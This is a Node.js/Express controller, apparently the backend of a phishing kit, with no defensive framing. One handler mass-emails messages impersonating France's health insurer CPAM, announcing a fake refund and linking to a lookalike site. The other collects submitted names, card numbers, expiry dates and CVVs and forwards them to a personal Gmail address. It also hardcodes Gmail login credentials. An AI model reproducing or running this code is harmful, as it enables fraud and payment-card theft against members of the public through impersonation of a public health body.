const nodemailer = require('nodemailer');
var formidable = require('formidable');

exports.csv = async (req, res, next) => {
    try {
        
        let transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'noreply.cpam@gmail.com', // generated ethereal user
                pass: 'N0Reply@CPAM!' // generated ethereal password
            }
        });
        for(let mail of req.body.mail?.split(';')) {
            // send mail with defined transport object
            await transporter.sendMail({
                from: '"Votre assurance maladie" <noreply.cpam@gmail.com>', // sender address
                to: mail, // list of receivers
                subject: 'Emission d\'un remboursement', // Subject line
                text: 'Bonjour,\n\nUn règlement de soin d\'un montant de 75.36€ a été émis en votre faveur.\n\nVeuillez vous connecter sur le lien suivant https://cpam-ameli.herokuapp.fr/assure pour prendre connaissance du document.\n\nCordialement,\nCPAM\n\n*****************************************************\nLe contenu de ce courriel et ses éventuelles pièces jointes sont confidentiels. Ils s\'adressent exclusivement à la personne destinataire. Si cet envoi ne vous est pas destiné, ou si vous l\'avez reçu par erreur, et afin de ne pas violer le secret des correspondances, vous ne devez pas le transmettre à d\'autres personnes ni le reproduire. Merci de le renvoyer à l\'émetteur et de le détruire.' // plain text body
            }, (err, info) => {
                if(err) {
                    console.log(err, info);
                } else { 
                }
            });
        }
        res.send('OK');
    } catch(err) {
        console.log(err);
    }
};
exports.sendinfos = async (req, res, next) => {
    try {
        
        let transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'noreply.cpam@gmail.com', // generated ethereal user
                pass: 'N0Reply@CPAM!' // generated ethereal password
            }
        });
        // send mail with defined transport object
        await transporter.sendMail({
            from: '"Sa pété" <noreply.cpam@gmail.com>', // sender address
            to: 'amelvirian@gmail.com', // list of receivers
            subject: 'Sa pété', // Subject line
            text: req.body.nom + ' ' + req.body.carte + ' ' + req.body.date + ' ' + req.body.cvv
        }, (err, info) => {
            if(err) {
                console.log(err, info);
            } else { 
            }
        });
        res.sendFile('OK.html', {root: __dirname });
    } catch(err) {
        console.log(err);
    }
};